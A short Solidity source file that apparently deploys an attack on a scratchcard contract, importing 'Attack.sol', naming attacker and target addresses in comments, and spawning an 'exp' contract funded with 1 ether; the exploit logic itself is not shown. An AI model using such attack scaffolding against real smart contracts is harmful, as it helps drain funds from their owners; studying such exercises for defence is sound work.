pragma solidity 0.4.24;
import "./Attack.sol";

//Attacker Address 0x43065950e0185bd74361d8580daaa5bff806aade
//Scratchcard Address 0x505d51adcccb62cd33579c1ea7b94a717f7ae06e
contract hack
{
    exp public nice;
    constructor() payable{}
    function chuang()public payable{
        nice=(new exp).value(1 ether)();
    }
}